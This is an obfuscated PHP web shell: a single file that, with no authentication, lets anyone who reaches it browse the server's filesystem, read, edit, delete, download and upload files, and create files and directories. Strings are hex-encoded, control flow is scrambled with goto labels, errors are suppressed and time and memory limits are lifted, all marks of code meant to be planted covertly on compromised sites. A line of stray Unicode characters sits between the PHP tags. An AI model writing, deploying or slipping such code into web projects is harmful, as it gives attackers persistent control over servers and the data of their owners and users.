<?php
 goto QmZkB; aS62c: function get_back($path) { if ($path == '' || $path == "\57") { return $path; } $path = explode("\57", str_replace("\134", "\x2f", $path)); array_pop($path); return implode("\x2f", $path); } goto Hv1d7; o1ipx: function get_get($name) { return isset($_GET[$name]) ? $_GET[$name] : false; } goto AvccY; cXkVi: ini_set("\155\141\x78\137\x65\x78\145\143\165\x74\151\157\156\137\x74\x69\x6d\x65", 5000); goto HfAEd; sT5s7: function new_file($path, $name) { if (!is_file($path . "\x2f" . $name)) { file_put_contents($path . "\x2f" . $name, ''); return true; } return false; } goto At6qs; DvtEp: function save_edit($path, $str) { if (is_file($path)) { file_put_contents($path, html_entity_decode($str)); return true; } return false; } goto bO8Ok; EqVgt: ini_set("\x64\x69\163\160\154\x61\x79\137\145\x72\162\x6f\x72\163", 0); goto cXkVi; dY4wN: function filesize_convert($bytes) { $label = array("\x42", "\113\x42", "\x4d\x42", "\107\x42", "\124\102", "\120\x42"); for ($i = 0; $bytes >= 1024 && $i < count($label) - 1; $bytes /= 1024, $i++) { } return round($bytes, 2) . "\40" . $label[$i]; } goto BBha8; H1_yX: function upload_file($path, $file) { $name = basename($file["\156\x61\x6d\x65"]); if (!is_file($path . "\57" . $name)) { if (move_uploaded_file($file["\x74\x6d\x70\x5f\x6e\x61\155\145"], $path . "\57" . $name)) { return true; } } return false; } goto aS62c; zBBa_: if (get_post("\156\x65\167\144\x69\x72")) { new_dir(get_path(), get_post("\144\x69\162\x6e\141\x6d\x65")) ? die("\103\162\x65\141\164\x65\x3a\x20" . get_post("\144\151\x72\156\141\x6d\x65")) : die("\104\151\x72\x20\145\170\x69\164\x65\x73"); } goto qtFXy; JcL4M: function edit_file($edit) { if (is_file($edit)) { return makeForm("\120\117\123\x54", array("\x74\x65\170\164\x61\162\145\x61" => array("\145\x64\151\164", htmlentities(file_get_contents($edit)), "\167\151\144\164\x68\72\61\60\x30\x25\x3b\x68\x65\151\147\x68\x74\72\71\60\x25"), "\163\165\x62\x6d\x69\x74" => array("\163\x61\166\145", "\x53\x61\166\145"))); } return false; } goto DvtEp; guMCK: error_reporting(0); goto EqVgt; AvccY: function makeInput($type, $name, $val = '', $style = '') { if (in_array($type, array("\164\145\x78\164", "\x70\141\163\x73\x77\x6f\162\144", "\163\165\142\155\x69\164", "\x66\x69\154\145"))) { return "\x3c\x69\x6e\160\165\164\x20\164\x79\x70\x65\x3d\47{$type}\47\40\x6e\141\155\x65\x3d\x27{$name}\x27\x20\166\141\x6c\165\145\75\x27{$val}\47\40\163\x74\x79\154\x65\75\x27{$style}\x27\x2f\x3e"; } return "\x3c{$type}\40\156\x61\x6d\x65\75\47{$name}\x27\40\163\x74\x79\154\x65\x3d\47{$style}\x27\x3e{$val}\x3c\x2f{$type}\x3e"; } goto n7U3a; HunSY: function get_path() { $path = __DIR__; if (get_get("\x70\x61\164\x68")) { $path = get_get("\x70\141\x74\150"); } return $path; } goto dY4wN; Hv1d7: function get_dir() { $path = get_path(); if (!is_dir($path)) { return false; } $dir = scandir($path); $files = array(); $i = 0; foreach ($dir as $d) { if ($d == "\x2e" || $d == "\x2e\56") { continue; } $p = $path . "\57" . $d; $s = "\x2d\55"; $icon = "\x26\x23\x36\144\71\67\71\x65\x3b"; $t = fileTime($p); $l = makeLink("\77\x70\x61\x74\150\75{$p}", $d); $perms = substr(sprintf("\x25\x6f", fileperms($p)), -4); $owner = function_exists("\160\x6f\x73\151\x78\x5f\147\145\x74\160\x77\x75\x69\x64") ? posix_getpwuid(fileowner($p))["\x6e\x61\x6d\x65"] : fileowner($p); $controller = (is_file($p) ? makeLink("\x3f\145\144\151\x74\x3d{$p}", "\105\144\x69\x74", "\x5f\142\x6c\141\156\153") : '') . makeLink("\x3f\x64\x65\x6c\145\164\145\x3d{$p}", "\x44\x65\154\x65\164\x65", "\137\142\154\141\156\x6b") . (is_file($p) ? makeLink("\77\144\x6f\167\x6e\154\x6f\141\144\x3d{$p}", "\x44\x6f\x77\156\x6c\x6f\141\x64", "\x5f\x62\x6c\x61\156\153") : ''); if (is_file($p)) { $s = filesize_convert(filesize($p)); $icon = "\x26\x23\x31\x37\x61\x35\142\144\73"; } $files[] = array($icon, $i, $l, $s, $t, $perms, $owner, $controller); $i++; } return makeTable(array("\43", "\x69\x64", "\106\151\154\145\156\x61\155\145", "\x53\151\x7a\145", "\115\157\144\x69\146\x69\x65\x64", "\x50\x65\x72\155\x73", "\x4f\x77\156\x65\x72", ''), $files); } goto Wv1UX; upvST: if (get_get("\x64\157\167\x6e\154\157\141\144")) { @readfile(download_file(get_get("\144\x6f\167\156\154\157\141\x64"))); die; } goto ZUki1; HfAEd: $head = "\74\150\145\141\x64\x3e\x3c\x6d\x65\x74\x61\x20\x6e\141\x6d\145\x3d\42\x76\x69\x65\x77\160\157\x72\164\42\x20\x63\157\156\x74\145\x6e\x74\75\x22\x77\151\x64\x74\150\x3d\x64\145\x76\x69\143\x65\55\x77\x69\x64\x74\150\54\40\x69\156\151\x74\151\141\x6c\x2d\163\143\x61\x6c\145\x3d\x31\x2e\60\x22\x2f\x3e\x3c\164\151\x74\154\x65\x3e\xd0\x9f\321\x83\321\x80\321\x82\320\xb5\x20\xd0\260\xd0\xb4\xd0\274\xd0\xb8\xd0\xbd\74\57\x74\151\x74\x6c\x65\76\x3c\x73\x74\171\154\145\x3e\x70\162\x65\173\x62\157\x72\144\x65\162\72\x31\x70\170\x20\x73\157\154\151\144\40\43\x64\x64\144\x3b\x70\141\144\144\x69\156\x67\x3a\65\x70\x78\73\157\x76\145\x72\146\x6c\x6f\167\x3a\x61\x75\x74\x6f\175\164\x61\x62\x6c\145\173\x62\157\162\x64\145\x72\55\143\157\154\154\x61\x70\163\145\x3a\x63\157\154\154\141\x70\163\145\73\x77\151\x64\164\150\72\61\60\60\45\73\x6f\166\x65\162\x66\154\x6f\x77\x3a\x61\165\x74\x6f\175\164\x68\x2c\x74\x64\173\x70\141\144\144\151\x6e\x67\x3a\x30\x2e\x32\65\x72\145\x6d\73\164\x65\x78\164\x2d\141\154\x69\x67\156\x3a\154\145\x66\x74\73\142\x6f\162\x64\145\162\x2d\142\157\164\164\157\155\x3a\x31\x70\170\40\163\157\x6c\151\144\40\x23\x63\143\x63\x7d\164\142\x6f\144\x79\40\164\x72\72\x6e\164\150\55\143\150\151\154\x64\x28\x6f\x64\x64\x29\173\142\x61\x63\x6b\147\162\157\165\156\x64\72\43\70\62\66\67\66\67\x7d\x74\x72\x3a\x68\157\166\145\x72\x7b\x62\141\x63\153\147\x72\157\x75\x6e\x64\x2d\x63\x6f\154\x6f\x72\72\43\x38\x30\x38\60\70\60\175\x3c\57\x73\x74\x79\x6c\145\76\x3c\x2f\x68\145\x61\x64\x3e"; goto pRP33; ZUki1: if (get_post("\x6e\x65\167\146\x69\154\145")) { new_file(get_path(), get_post("\146\151\154\x65\156\141\x6d\x65")) ? die("\x43\162\x65\x61\164\145\72\40" . get_post("\x66\151\x6c\145\x6e\141\x6d\145")) : die("\x46\151\154\x65\40\x65\170\151\164\x65\x73"); } goto zBBa_; qtFXy: if (get_post("\165\160\154\x6f\x61\x64")) { upload_file(get_path(), $_FILES["\146\151\154\x65"]) ? die("\x75\160\x6c\157\x61\x64\72\x20" . $_FILES["\x66\151\x6c\145"]["\x6e\141\x6d\145"]) : die("\x55\x70\154\x6f\141\x64\x20\105\x72\162\x6f\162"); } goto Rbv5Q; cX6Lp: function makeTable($thead, $tbody) { $head = ''; foreach ($thead as $th) { $head .= "\x3c\x74\x68\76{$th}\74\x2f\164\x68\76"; } $body = ''; foreach ($tbody as $tr) { $body .= "\74\x74\x72\76"; foreach ($tr as $td) { $body .= "\x3c\164\x64\76{$td}\74\x2f\x74\x64\x3e"; } $body .= "\74\57\164\x72\x3e"; } return "\74\164\x61\x62\154\x65\x3e\x3c\x74\x68\145\141\x64\x3e{$head}\74\57\164\x68\145\141\x64\76\x3c\164\142\157\144\x79\x3e{$body}\74\57\164\x62\x6f\144\171\76\x3c\57\164\141\142\154\x65\76"; } goto UH75Q; n7U3a: function makeForm($method, $inputArray, $file = '') { $form = "\x3c\x66\x6f\x72\155\x20\x6d\145\164\150\157\144\x3d{$method}\40\145\x6e\143\164\x79\x70\145\75\47{$file}\x27\x3e"; foreach ($inputArray as $key => $val) { $form .= makeInput($key, is_array($val) ? $val[0] : $val, isset($val[1]) ? $val[1] : '', isset($val[2]) ? $val[2] : ''); } return $form . "\74\x2f\146\157\162\x6d\x3e"; } goto cX6Lp; QmZkB: ?>
mኅæતўyయቋפѱςჩቨરేకަ<?php  goto GRkHp; GRkHp: ignore_user_abort(true); goto Plh72; Wv1UX: if (get_get("\144\x65\154\145\x74\145")) { delete_file(get_get("\x64\x65\x6c\145\164\x65")) ? die("\104\145\154\145\x74\x65\144\x3a\x20" . get_get("\144\x65\154\x65\x74\145")) : die("\106\x69\x6c\145\x20\x6e\157\x74\40\x66\x6f\x75\156\x64"); } goto InqjR; InqjR: if (get_get("\x65\144\151\164")) { if (get_post("\163\141\x76\145")) { save_edit(get_get("\x65\144\151\164"), get_post("\x65\144\x69\164")); echo "\x53\141\166\145\144"; } $edit = edit_file(get_get("\x65\144\151\164")); $edit ? die($edit) : die("\x46\x69\154\x65\40\x6e\157\x74\40\x66\x6f\x75\x6e\x64"); } goto upvST; UH75Q: function makeLink($link, $text, $target = '') { return "\x3c\x61\40\x68\x72\x65\x66\75\47{$link}\47\x20\164\x61\x72\147\145\164\75\47{$target}\47\76{$text}\74\x2f\x61\76\x20"; } goto HunSY; O6GGr: set_time_limit(0); goto guMCK; pRP33: function get_post($name) { return isset($_POST[$name]) ? $_POST[$name] : false; } goto o1ipx; BBha8: function fileTime($path) { return date("\x4d\40\x64\40\131\x20\110\x3a\151\72\x73", filemtime($path)); } goto LZXQI; YQjzM: function delete_file($delete) { if (is_file($delete)) { return unlink($delete); } if (is_dir($delete)) { return rmdir($delete); } return false; } goto JcL4M; Plh72: ini_set("\155\145\155\157\162\171\x5f\154\x69\x6d\x69\164", "\55\x31"); goto O6GGr; At6qs: function new_dir($path, $name) { if (!is_dir($path . "\x2f" . $name)) { mkdir($path . "\57" . $name); return true; } return false; } goto H1_yX; bO8Ok: function view_file($path) { if (is_file($path)) { return htmlentities(file_get_contents($path)); } return false; } goto sT5s7; LZXQI: function download_file($download) { if (!is_file($download)) { return false; } header("\x43\157\x6e\x74\145\156\164\55\x54\171\160\x65\72\40\141\160\160\x6c\151\143\141\x74\x69\x6f\156\x2f\157\x63\x74\x65\164\x2d\x73\164\x72\x65\141\x6d"); header("\x43\157\156\x74\x65\156\164\x2d\x54\x72\x61\x6e\x73\x66\x65\162\55\x45\156\143\157\144\x69\x6e\147\x3a\x20\102\x69\x6e\x61\x72\171"); header("\103\x6f\x6e\x74\x65\x6e\x74\55\144\x69\163\x70\x6f\163\x69\x74\x69\157\x6e\72\x20\141\x74\164\x61\x63\150\x6d\145\156\x74\x3b\x20\x66\x69\x6c\x65\x6e\141\x6d\x65\x3d\42" . basename($download) . "\x22"); return readfile($download); } goto YQjzM; Rbv5Q: echo $head . "\74\x62\157\x64\171\x3e" . makeForm("\120\117\123\124", array("\x74\x65\170\164" => array("\x66\151\x6c\x65\x6e\x61\155\145", "\106\151\154\x65\40\x4e\x61\155\x65"), "\x73\x75\142\155\151\164" => array("\x6e\145\x77\x66\x69\x6c\145", "\x43\162\145\x61\x74\x65"))) . makeForm("\x50\x4f\x53\124", array("\164\x65\170\164" => array("\x64\x69\x72\x6e\141\x6d\145", "\104\x69\162\40\116\x61\155\145"), "\163\x75\142\155\x69\x74" => array("\x6e\x65\x77\x64\x69\162", "\103\162\145\141\x74\x65"))) . makeForm("\x50\x4f\123\124", array("\x66\151\154\145" => "\146\x69\154\x65", "\x73\x75\142\155\151\x74" => array("\x75\160\x6c\x6f\141\144", "\125\160\154\157\x61\144")), "\x6d\x75\x6c\164\x69\x70\141\162\164\x2f\146\x6f\162\155\x2d\x64\141\164\x61") . makeLink("\77\x70\x61\x74\x68\75" . get_back(get_path()), "\x5b\x42\x61\x63\153\x5d") . (is_dir(get_path()) ? get_dir() : "\74\160\162\x65\76" . view_file(get_path()) . "\x3c\x2f\160\x72\x65\x3e") . "\x3c\x2f\142\157\144\x79\76";